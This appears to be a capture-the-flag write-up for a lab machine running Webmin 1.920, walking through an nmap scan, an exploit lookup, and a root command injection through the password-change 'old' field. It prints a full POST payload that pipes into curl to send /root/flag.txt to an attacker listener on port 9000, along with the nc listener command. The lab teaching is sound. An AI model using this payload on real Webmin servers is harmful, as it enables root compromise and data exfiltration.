---
layout: post
title: "CTF7E4 - UNICORN Machine"
categories: CTF7E4
---

## Summary
&nbsp;
This machine is about a recent vulnerablity found on Webmin <= 1.920 via password change. By adding a pipe command “|” to the old password field using a POST request, a remote attacker could run arbitrary commands as the root user on the system.

&nbsp;

- **OS:** Linux
- **IP:** 10.10.10.44
- **Difficulty:** Easy

## Steps
&nbsp;

In order to hack this machine, we should know what ports are open and we can do that by using a popular tool such as Nmap.

> **→ nmap -sC -sV -oN scan 10.10.10.44**{: style="color: red"}

**-sC** Use default scripts
**-sV** Probe open ports to determine service/version info
**-oN** Save output in nmap format.
&nbsp;

```
Nmap scan report for unicorn (10.10.10.44)
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f1:b4:bf:cb:95:d7:9e:07:a7:a1:1f:20:cb:02:c5:69 (RSA)
|   256 ab:ee:da:73:a7:d4:9c:f2:3b:2b:17:ff:6d:5a:04:61 (ECDSA)
|_  256 17:8c:23:ff:b5:a3:f8:af:ca:6c:b3:a2:00:79:b5:97 (ED25519)
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
&nbsp;
&nbsp;

Browsing to http://10.10.10.44:10000/, a redirect message to https://unicorn:1000/ appeared. 
&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn1.png){:.images}
&nbsp;

In order to access this page, we should add **unicorn** to our /etc/hosts file.

> **→ echo "10.10.10.44 unicorn" >> /etc/hosts**{: style="color: red"}

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn2.png){:.images}
&nbsp;

Bruteforcing the credentials it's not necessary here since an exploit already exists.

> **→ searchsploit webmin 1.920**{: style="color: red"}

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn3.png){:.images}
&nbsp;

Analyzing the exploit seen in the image below, we can see that the vulnerable parameter is **old** and after we add a **'\|'**(pipe) after the password string, we are able to run arbitrary commands as the root user on the system.

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn4.png){:.images}
&nbsp;

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn6.png){:.images}
&nbsp;

To verify the command execution, we can make a single request to our machine listening on a random port.

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn7.png){:.images}
&nbsp;

Since we know that webmin is running with root privileges, we don't need to get a reverse shell. We can try to read the /root/flag.txt and send the output to our server using curl as seen on the screenshot below.
&nbsp;

Request:
**user=spenkk&pam=&expired=2&old=SPENKK\|curl http://10.10.20.2:9000/?flag=****\`cat /root/flag.txt\`**{: style="color: red"}**&new1=arbenn&new2=arbenn**

&nbsp;
![unicorn]({{ site.baseurl }}/assets/images/ctf7e4/machines/unicorn8.png){:.images}
&nbsp;

Attacker Machine:
> **→ nc -lvp 9000**{: style="color: red"}

```
Connection from 10.10.10.44:41136
GET /?flag=XORb89b400eaed5ba88b8bdef14e3a015a8f19f0ba4 HTTP/1.1
Host: 10.10.20.2:9000
User-Agent: curl/7.58.0
Accept: */*
```


&nbsp;
I hope you had fun solving this machine and learning something new.